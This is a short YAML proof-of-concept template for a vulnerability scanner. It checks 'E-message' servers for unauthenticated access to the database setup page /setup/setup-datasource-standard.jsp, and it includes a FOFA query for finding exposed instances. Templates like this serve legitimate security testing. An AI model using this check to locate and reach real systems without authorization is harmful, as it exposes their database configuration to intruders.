id: poc-yaml-e-message-unauthorized-access
info:
  name: E-message 越权访问漏洞
  severity: high
  tags:
  - 两高一弱
  - 权限绕过
  finger: e-message
  fofa: title="数据库设置 - 标准连接"
requests:
- method: GET
  path: /setup/setup-datasource-standard.jsp
  expression: 'status_code == 200 &&

    contains(body,"数据库设置 - 标准连接") &&

    contains(body,"用户名：") &&

    contains(body,"数据库驱动选项")

    '
variables: {}
transport: http
